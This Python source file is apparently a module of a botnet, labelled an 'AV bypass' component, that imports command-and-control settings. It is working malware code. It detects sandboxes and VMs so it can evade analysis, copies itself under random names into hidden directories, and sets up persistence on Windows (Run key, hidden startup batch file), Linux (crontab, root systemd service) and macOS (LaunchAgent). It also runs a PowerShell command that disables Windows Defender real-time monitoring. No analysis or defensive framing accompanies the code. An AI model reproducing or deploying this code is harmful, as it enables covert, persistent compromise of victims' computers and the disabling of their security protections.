import os
import sys
import platform
import subprocess
import time
import random
import string
import shutil
from typing import Optional

# Import from config if available
try:
    from config import BOT_NAME, C2_IP, C2_PORT, KEY, IV
    try:
        from config import LOG_FILE
    except ImportError:
        LOG_FILE = "botnet.log"
except ImportError:
    BOT_NAME = "bot_service"
    C2_IP = "127.0.0.1"
    C2_PORT = 4444
    KEY = b"0123456789abcdef"
    IV = b"fedcba9876543210"
    LOG_FILE = "botnet.log"

def log(msg: str, level="INFO"):
    """Simple logging mechanism"""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{timestamp}] [{level}] {msg}\n")
    except Exception:
        pass

def get_random_name(length=8) -> str:
    """Generates a random alphanumeric string for renaming."""
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

# ============================================
# 1. Advanced Sandbox & VM Detection
# ============================================

def is_sandboxed() -> bool:
    """
    Deep checks to detect if running in a Sandbox, VM, or Emulator.
    Returns True if detected (to exit or sleep), False otherwise.
    """
    os_name = platform.system()

    try:
        if os_name == "Windows":
            try:
                import winreg
                keys_to_check = [
                    r"HARDWARE\ACPI\DSDT\VBOX__",
                    r"HARDWARE\ACPI\FADT\VBOX__",
                    r"HARDWARE\DESCRIPTION\System\BIOS"
                ]
                for key_path in keys_to_check:
                    try:
                        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                            value = winreg.QueryValueEx(key, "SystemManufacturer")[0]
                            if any(vm in value.upper() for vm in ["MICROSOFT", "VMWARE", "VIRTUALBOX"]):
                                log(f"[!] VM Detected via Registry: {value}", "WARN")
                                return True
                    except FileNotFoundError:
                        continue
            except ImportError:
                pass

            # ✅ ঠিক করা হয়েছে - ফিল্টার ছাড়া tasklist চালানো
            try:
                proc_list = subprocess.check_output(["tasklist"]).decode("utf-8").lower()
                sandbox_procs = ["vmtoolsd.exe", "vboxservice.exe", "prl_cc.exe", "prl_tools.exe",
                                 "xenservice.exe", "cuckoo.exe", "outguess.exe"]
                for proc in sandbox_procs:
                    if proc in proc_list:
                        log(f"[!] Sandbox Process Detected: {proc}", "WARN")
                        return True
            except:
                pass

        elif os_name == "Linux":
            dmi_files = ["/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor"]
            for file_path in dmi_files:
                if os.path.exists(file_path):
                    with open(file_path, "r") as f:
                        content = f.read().lower()
                        if any(vm in content for vm in ["virtualbox", "vmware", "kvm", "qemu"]):
                            log(f"[!] VM Detected via DMI: {content}", "WARN")
                            return True

            if os.path.exists("/proc/cpuinfo"):
                with open("/proc/cpuinfo", "r") as f:
                    if "hypervisor" in f.read().lower():
                        log("[!] Hypervisor Flag Detected (VM likely)", "WARN")

        elif os_name == "Darwin":
            result = subprocess.run(["system_profiler", "SPHardwareDataType"], capture_output=True, text=True)
            if "Virtual" in result.stdout:
                log("[!] Virtual Machine Detected on macOS", "WARN")
                return True

    except Exception as e:
        log(f"[-] Error during Sandbox Check: {e}", "ERROR")

    return False


# ============================================
# 2. Anti-Debugging & Process Hiding
# ============================================

def anti_debug():
    """Basic anti-debugging technique."""
    pass

def hide_process():
    """Hides the bot process from basic task managers."""
    os_name = platform.system()
    script_path = sys.argv[0]

    new_name = f".{get_random_name(6)}" if os_name != "Windows" else f"{get_random_name(6)}.exe"

    if os_name == "Windows":
        dest_dir = os.path.join(os.getenv('APPDATA'), '.cache')
    elif os_name in ["Linux", "Darwin"]:
        dest_dir = os.path.expanduser("~/.local/share")

    try:
        os.makedirs(dest_dir, exist_ok=True)
        dest_path = os.path.join(dest_dir, new_name)

        shutil.copy2(script_path, dest_path)

        if os_name == "Windows":
            subprocess.run(['attrib', '+h', '+s', dest_path], shell=True)
        elif os_name in ["Linux", "Darwin"]:
            os.chmod(dest_path, 0o755)

        log(f"[+] Process Hidden at: {dest_path}")
        return dest_path
    except Exception as e:
        log(f"[-] Failed to hide process: {e}", "ERROR")
        return script_path


# ============================================
# 3. OS-Specific AV Bypass & Persistence
# ============================================

def persist_windows():
    """Windows-specific persistence and AV evasion."""
    log("[*] Applying Windows AV Evasion...")

    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, BOT_NAME, 0, winreg.REG_SZ, sys.argv[0])
        log("[+] Windows Registry Persistence Added (User Level)")
    except Exception as e:
        log(f"[-] Registry Error: {e}", "ERROR")

    try:
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        bat_path = os.path.join(startup_dir, f"{get_random_name(6)}.bat")
        with open(bat_path, "w") as f:
            f.write(f'@echo off\nstart "" "{sys.argv[0]}"\nexit\n')
        subprocess.run(['attrib', '+h', '+s', bat_path], shell=True)
        log("[+] Startup Folder Persistence Added")
    except Exception as e:
        log(f"[-] Startup Folder Error: {e}", "ERROR")

    try:
        subprocess.run(["powershell", "-Command",
                        "Set-MpPreference -DisableRealtimeMonitoring $true"],
                       shell=True, check=False)
        log("[+] Windows Defender Real-time Monitoring Disabled")
    except Exception:
        pass


def persist_linux():
    """Linux-specific persistence and AV evasion."""
    log("[*] Applying Linux AV Evasion...")

    try:
        result = subprocess.run(['crontab', '-l'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        existing_cron = result.stdout.decode('utf-8') if result.returncode == 0 else ""
        cron_job = f"* * * * * {sys.argv[0]} >> /dev/null 2>&1 &\n"
        if cron_job.strip() not in existing_cron:
            subprocess.run(['crontab', '-'], input=cron_job.encode(), check=True)
            log("[+] Linux Crontab Persistence Added")
    except Exception as e:
        log(f"[-] Crontab Error: {e}", "ERROR")

    try:
        if os.geteuid() == 0:
            service_name = f"{BOT_NAME}.service"
            service_path = f"/etc/systemd/system/{service_name}"
            with open(service_path, "w") as f:
                f.write(f"""[Unit]
Description={BOT_NAME} Service
After=network.target

[Service]
ExecStart={sys.argv[0]}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
""")
            subprocess.run(["systemctl", "daemon-reload"], stdout=subprocess.DEVNULL)
            subprocess.run(["systemctl", "enable", service_name], stdout=subprocess.DEVNULL)
            subprocess.run(["systemctl", "start", service_name], stdout=subprocess.DEVNULL)
            log("[+] Systemd Service Added (Root)")
    except Exception as e:
        log(f"[-] Systemd Error: {e}", "ERROR")

    try:
        subprocess.run(['chmod', '+x', sys.argv[0]], stdout=subprocess.DEVNULL)
        subprocess.run(['chown', 'root:root', sys.argv[0]], stdout=subprocess.DEVNULL)
    except:
        pass


def persist_macos():
    """macOS-specific persistence and AV evasion."""
    log("[*] Applying macOS AV Evasion...")

    try:
        user_home = os.path.expanduser("~")
        launch_agents_dir = os.path.join(user_home, "Library", "LaunchAgents")
        os.makedirs(launch_agents_dir, exist_ok=True)

        plist_name = f"{BOT_NAME}.plist"
        plist_path = os.path.join(launch_agents_dir, plist_name)

        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{BOT_NAME}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{sys.argv[0]}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""

        with open(plist_path, "w") as f:
            f.write(plist_content)

        subprocess.run(["launchctl", "load", plist_path], stdout=subprocess.DEVNULL)
        log("[+] macOS LaunchAgent Persistence Added")
    except Exception as e:
        log(f"[-] LaunchAgent Error: {e}", "ERROR")

    try:
        cron_job = f"* * * * * {sys.argv[0]} >> /dev/null 2>&1 &\n"
        subprocess.run(['crontab', '-'], input=cron_job.encode(), check=False)
    except Exception:
        pass


# ============================================
# Main Orchestrator - Bypass Antivirus
# ============================================

def bypass_antivirus():
    """
    Main function to execute all AV bypass techniques.
    This is the main entry point called by other modules.
    """
    log("[*] Starting Ultra-Advanced AV Bypass Module...")

    if is_sandboxed():
        log("[!] Advanced Sandbox/VM Detected. Entering Stealth Mode...", "WARN")
        time.sleep(60)
        return False

    hidden_path = hide_process()

    os_name = platform.system()

    if os_name == "Windows":
        persist_windows()
    elif os_name == "Linux":
        persist_linux()
    elif os_name == "Darwin":
        persist_macos()
    else:
        log(f"[!] Unsupported OS: {os_name}")

    log("[+] Ultra-Advanced AV Bypass Completed Successfully.")
    return True


# Alias for backward compatibility
def run_av_bypass():
    """Alias for bypass_antivirus()"""
    return bypass_antivirus()


if __name__ == "__main__":
    bypass_antivirus()
